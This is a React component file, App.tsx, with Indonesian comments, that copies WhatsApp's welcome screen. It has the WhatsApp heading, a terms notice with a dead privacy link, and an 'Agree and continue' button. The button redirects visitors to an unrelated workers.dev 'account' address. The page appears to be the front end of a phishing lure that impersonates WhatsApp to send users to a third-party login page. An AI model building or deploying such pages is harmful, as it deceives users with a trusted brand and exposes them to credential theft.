// App.tsx
import './App.css'

function App() {
  const handleAgree = () => {
    // Redirect ke URL yang ditentukan
    window.location.href = 'https://account.soeparnocorp.workers.dev/'
  }

  return (
    <>
      <div>
        <a href="#" onClick={(e) => e.preventDefault()}>
          <img src="/vite.svg" className="logo coin-flip" alt="Vite logo" />
        </a>
      </div>
      
      <div className="content-wrapper">
        <h1>Welcome to WhatsApp</h1>
        
        <p className="terms-text">
          Read our <a href="#">Privacy Policies</a>. Tap "Agree and continue" to accept our Terms of Service.
        </p>

        <div className="language-selector">
          <span>English ▼</span>
        </div>

        <button 
          className="agree-button"
          onClick={handleAgree}
        >
          Agree and continue
        </button>

        {/* Footer dihapus sesuai permintaan */}
      </div>
    </>
  )
}

export default App
